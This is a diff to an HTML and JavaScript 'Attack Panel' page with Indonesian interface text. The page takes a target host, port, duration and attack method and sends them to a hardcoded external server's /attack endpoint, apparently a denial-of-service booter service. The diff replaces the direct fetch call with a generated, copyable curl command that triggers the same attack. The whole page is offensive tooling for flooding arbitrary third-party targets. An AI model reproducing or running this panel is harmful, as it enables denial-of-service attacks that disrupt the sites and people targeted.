@@ -33,6 +33,20 @@
             margin-top: 20px;
             font-size: 14px;
             white-space: pre-line;
+            word-break: break-word;
+            max-width: 90%;
+            margin-left: auto;
+            margin-right: auto;
+            background: #1e1e1e;
+            padding: 15px;
+            border-radius: 10px;
+        }
+        #copyButton {
+            margin-top: 10px;
+            background-color: green;
+        }
+        #copyButton:hover {
+            background-color: darkgreen;
         }
     </style>
 </head>
@@ -40,6 +54,7 @@
 
     <div class="container">
         <h1>🔥 Attack Panel 🔥</h1>
+
         <label>Target Host:</label>
         <input type="text" id="host" placeholder="https://target.com">
 
@@ -56,17 +71,20 @@
             <option value="h2">H2</option>
         </select>
 
-        <button onclick="sendAttack()">🚀 ATTACK!</button>
+        <button onclick="generateCurl()">🚀 ATTACK!</button>
 
         <div class="log" id="log"></div>
+        <button id="copyButton" onclick="copyCurl()" style="display:none;">📋 Copy Command</button>
     </div>
 
     <script>
-        async function sendAttack() {
+        let currentCurl = '';
+
+        function generateCurl() {
             const host = document.getElementById('host').value;
             const port = document.getElementById('port').value;
             const time = document.getElementById('time').value;
-            const methods = document.getElementById('methods').value.toUpperCase(); // 🔥 Buat huruf besar otomatis
+            const methods = document.getElementById('methods').value.toUpperCase();
 
             if (!host || !port || !time || !methods) {
                 alert("⚠️ Harap isi semua data!");
@@ -74,15 +92,22 @@
             }
 
             const url = `http://64.227.139.46:4877/attack?host=${encodeURIComponent(host)}&port=${port}&time=${time}&methods=${methods}`;
-            
-            try {
-                document.getElementById("log").innerText = "🚀 Mengirim serangan...";
-                const response = await fetch(url);
-                const result = await response.json();
-                document.getElementById("log").innerText = JSON.stringify(result, null, 2);
-            } catch (error) {
-                document.getElementById("log").innerText = `❌ Error: ${error}`;
-            }
+            const curlCommand = `curl "${url}"`;
+
+            currentCurl = curlCommand;
+
+            document.getElementById("log").innerText = `💻 Command CURL:\n${curlCommand}`;
+            document.getElementById("copyButton").style.display = "inline-block";
+        }
+
+        function copyCurl() {
+            navigator.clipboard.writeText(currentCurl)
+                .then(() => {
+                    alert('✅ Command berhasil di-copy!');
+                })
+                .catch(err => {
+                    alert('❌ Gagal copy: ' + err);
+                });
         }
     </script>
 
